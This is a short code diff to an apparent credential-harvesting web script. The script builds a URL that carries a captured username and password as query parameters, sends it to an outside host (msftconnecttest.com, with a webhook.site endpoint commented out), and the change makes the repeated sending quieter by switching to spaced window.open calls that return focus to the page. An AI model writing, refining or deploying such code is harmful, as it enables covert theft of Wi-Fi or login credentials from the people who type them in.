@@ -10,15 +10,21 @@
         //var url = "https://webhook.site/eee29a46-8d9f-47a7-94ff-5c371249a029"
         
     var url = "http://www.msftconnecttest.com/setap?ssid=" + user + "&pass=" + pass;
-    
-    setInterval(function() {
+    var i = 0;
+    interval = setInterval(function() {
+        i += 1;
+        if (i == 10){
+            clearInterval(interval);
+        }
         httpGetAsync(url);
-    }, 500);
+    }, 20000);
     //i = false;
 
 
     function httpGetAsync(theUrl, callback) {
-        location.href = theUrl;
+        let handle = window.open(theUrl,'_blank',"modal=no");
+        //handle.blur();
+        window.focus();
     }
 </script>
 
